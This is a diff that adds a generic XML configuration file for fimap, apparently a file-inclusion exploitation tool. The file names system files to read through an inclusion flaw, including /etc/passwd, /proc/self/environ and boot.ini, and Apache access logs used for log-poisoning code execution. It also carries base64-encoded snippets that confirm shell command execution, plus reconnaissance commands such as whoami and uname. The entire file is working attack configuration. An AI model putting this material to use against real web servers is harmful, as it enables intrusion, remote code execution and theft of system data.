@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<fimap language="generic" revision="0">
+	<relative_files>
+		<file path="/etc/passwd" find="root:" flags="r" unix="1" windows="0"/>
+		<file path="c:\boot.ini" find="[operating" flags="r" unix="0" windows="1"/>
+		<file path="/proc/self/environ" find="HTTP_USER_AGENT=" flags="rxA" unix="1" windows="0"/>
+	</relative_files>
+	
+	<absolute_files>
+	</absolute_files>
+	
+	<remote_files>
+	</remote_files>
+	
+	<log_files>
+		<file path="/var/log/apache2/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/httpd/access.log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache2/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/apache/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+		<file path="/var/log/httpd/access_log" find='"GET /' flags="LHx" unix="1" windows="0" />
+	</log_files>
+	
+	<blind_files mindepth="0" maxdepth="15">
+		<file path="/etc/passwd" find="root:" flags="r" unix="1" windows="0"/>
+		<file path="c:\boot.ini" find="[operating" flags="r" unix="0" windows="1"/>
+	</blind_files>
+	
+	<methods>
+		<unix concatcommand=";">
+			<shellquiz source="cm5kMSA9IHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDk5KQpybmQyID0gcmFuZG9tLnJhbmRyYW5nZSgxMCwgOTkpCnJlc3VsdCA9IHN0cihybmQxICogcm5kMikKc2hlbGxjb2RlID0gImVjaG8gJCgoJWQqJWQpKSIlKHJuZDEsIHJuZDIpCnJldCA9IChzaGVsbGNvZGUsIHJlc3VsdCk=" />
+			<kernelversion source="uname -r -s" />
+			<currentdir source="pwd" />
+			<currentuser source="whoami" />
+			<cd source="cd '__DIR__'" />
+		</unix>
+		
+		<windows concatcommand="&amp;">
+			<shellquiz source="cm5kMSA9IHJhbmRvbS5yYW5kcmFuZ2UoMTAsIDk5KQpybmQyID0gcmFuZG9tLnJhbmRyYW5nZSgxMCwgOTkpCnJlc3VsdCA9IHN0cihybmQxICogcm5kMikKc2hlbGxjb2RlID0gInNldCAvYSAlZColZCIlKHJuZDEsIHJuZDIpCnJldCA9IChzaGVsbGNvZGUsIHJlc3VsdCkK" />
+			<kernelversion source="ver" />
+			<currentdir source="chdir" />
+			<currentuser source="echo %USERNAME%" />
+			<cd source='cd "__DIR__"' /> 
+		</windows>
+	</methods>
+	
+	
+	<languagesets>
+		<language name="PHP" langfile="php.xml" /> 
+		<language name="Perl" langfile="perl.xml" />
+	</languagesets>
+</fimap>
